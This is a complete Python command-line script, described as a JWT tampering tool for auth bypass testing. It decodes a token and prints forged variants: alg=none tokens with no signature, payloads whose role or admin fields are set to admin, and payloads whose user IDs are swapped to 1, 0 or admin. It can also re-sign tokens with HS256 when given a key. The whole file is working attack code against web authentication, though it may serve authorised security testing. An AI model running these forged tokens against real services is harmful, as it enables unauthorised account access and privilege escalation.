#!/usr/bin/env python3
"""JWT tampering tool — decode, modify, and re-encode JWT tokens for auth bypass testing."""
import base64
import json
import hmac
import hashlib
import argparse
import sys

def b64decode_pad(s):
    s = s.replace('-', '+').replace('_', '/')
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.urlsafe_b64decode(s)

def b64encode_nopad(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def decode_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    header = json.loads(b64decode_pad(parts[0]))
    payload = json.loads(b64decode_pad(parts[1]))
    return header, payload, parts[2]

def encode_jwt(header, payload, key="", algorithm="none"):
    h = b64encode_nopad(json.dumps(header, separators=(',', ':')))
    p = b64encode_nopad(json.dumps(payload, separators=(',', ':')))
    if algorithm == "none":
        return f"{h}.{p}."
    elif algorithm == "HS256":
        signing_input = f"{h}.{p}".encode()
        sig = hmac.new(key.encode(), signing_input, hashlib.sha256).digest()
        return f"{h}.{p}.{b64encode_nopad(sig)}"
    return f"{h}.{p}."

def main():
    parser = argparse.ArgumentParser(description="JWT tampering tool")
    parser.add_argument("token", help="JWT token to analyze/tamper")
    parser.add_argument("--decode-only", action="store_true", help="Only decode, don't generate tampered versions")
    parser.add_argument("--set", action="append", default=[], help="Set payload field (key=value)")
    parser.add_argument("--set-header", action="append", default=[], help="Set header field (key=value)")
    parser.add_argument("--key", default="", help="Signing key for HS256 re-signing")
    parser.add_argument("--json-output", action="store_true", help="Output as JSON")
    args = parser.parse_args()

    header, payload, sig = decode_jwt(args.token)

    if args.decode_only or (not args.set and not args.set_header):
        output = {
            "header": header,
            "payload": payload,
            "algorithm": header.get("alg", "unknown"),
            "signature": sig[:20] + "...",
        }
        if args.json_output:
            print(json.dumps(output, indent=2))
        else:
            print(f"Algorithm: {header.get('alg', 'unknown')}")
            print(f"Header: {json.dumps(header, indent=2)}")
            print(f"Payload: {json.dumps(payload, indent=2)}")

        if not args.decode_only:
            print(f"\n--- Tampered Tokens ---")
            # alg=none attack
            none_header = {**header, "alg": "none"}
            print(f"\nalg=none:\n  {encode_jwt(none_header, payload, algorithm='none')}")

            # Role escalation
            for role_key in ['role', 'is_admin', 'admin', 'privilege', 'group']:
                if role_key in payload:
                    tampered = {**payload, role_key: 'admin' if role_key != 'is_admin' else True}
                    print(f"\n{role_key}=admin:\n  {encode_jwt(none_header, tampered, algorithm='none')}")

            # User ID swap
            for uid_key in ['sub', 'user_id', 'uid', 'id', 'userId']:
                if uid_key in payload:
                    for test_id in ['1', '0', 'admin']:
                        tampered = {**payload, uid_key: test_id}
                        print(f"\n{uid_key}={test_id}:\n  {encode_jwt(none_header, tampered, algorithm='none')}")
                    break
        return

    # Apply modifications
    for kv in args.set:
        k, v = kv.split("=", 1)
        try:
            v = json.loads(v)
        except (json.JSONDecodeError, ValueError):
            pass
        payload[k] = v

    for kv in args.set_header:
        k, v = kv.split("=", 1)
        header[k] = v

    alg = header.get("alg", "none")
    if alg == "none" or not args.key:
        header["alg"] = "none"
        result = encode_jwt(header, payload, algorithm="none")
    else:
        result = encode_jwt(header, payload, key=args.key, algorithm=alg)

    if args.json_output:
        print(json.dumps({"tampered_token": result, "header": header, "payload": payload}))
    else:
        print(f"Tampered token:\n{result}")

if __name__ == "__main__":
    main()
